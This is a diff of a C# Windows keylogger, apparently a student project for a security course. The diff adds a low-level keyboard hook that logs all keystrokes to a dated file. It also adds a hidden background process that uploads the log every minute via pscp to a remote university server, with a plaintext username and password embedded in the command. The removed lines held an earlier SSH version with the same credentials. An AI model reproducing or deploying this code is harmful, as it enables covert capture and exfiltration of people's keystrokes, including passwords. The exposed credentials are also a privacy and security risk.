@@ -3,7 +3,7 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
-using Renci.SshNet;
+using System.Threading;
 
 class InterceptKeys
 {
@@ -11,9 +11,13 @@ class InterceptKeys
     private const int WM_KEYDOWN = 0x0100;
     private static LowLevelKeyboardProc _proc = HookCallback;
     private static IntPtr _hookID = IntPtr.Zero;
+    private static string fileName = "log_";
 
     public static void Main()
     {
+        fileName = fileName + DateTime.Today.Month + "_" + DateTime.Today.Day + ".txt";
+        Thread workerThread = new Thread(copyFileToServer);
+        workerThread.Start();
         _hookID = SetHook(_proc);
         Application.Run();
         UnhookWindowsHookEx(_hookID);
@@ -52,50 +56,35 @@ class InterceptKeys
             key = ' ';
         else if (key == 13)
             key = '\n';
-       // else if (key == )
 
-
-        if (key > 31 && key < 126)
-        {
-            //String name = (new KeysConverter()).ConvertToString(p);
-            using (StreamWriter writer = new StreamWriter("log.txt", true))
+        //if (key > 31 && key < 126)
+        //{
+            using (StreamWriter writer = new StreamWriter(fileName, true))
             {
                 writer.Write(key.ToString());
             }
-        }
-
-        copyFileToServer(readBytesFromFile());
+        //}
     }
 
-    private static Stream readBytesFromFile()
+    private static void copyFileToServer()
     {
-        FileStream fileStream = new FileStream("log.txt", FileMode.Open);
-        return fileStream;
-    }
-
-
-    private static void copyFileToServer(Stream fileStream)
-    {
-        string hostname = "et791.eng.utoledo.edu";
-        string username = "kglosse";
-        string password = "kglosseCSET3100";
-        int port = 22;
-
-        using (var client = new SshClient(hostname, username, password))
+        while (true)
         {
+            Thread.Sleep(60000); // do only once every 60 seconds
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C pscp -pw kglosseCSET3100 -batch -q -scp " + fileName + " kglosse@et791.ni.utoledo.edu:cset4850/logs/" + fileName;
+            process.StartInfo = startInfo;
             try
             {
-                client.Connect(); // find the execption message
+                process.Start();
             }
             catch (Exception e)
             {
-                MessageBox.Show(e.Message);
+                continue;
             }
-
-          //  client.UploadFile(fileStream, "/home/kglosse/cset4850/logs/", true, null);
-
-            
-            client.Disconnect();
         }
     }
 
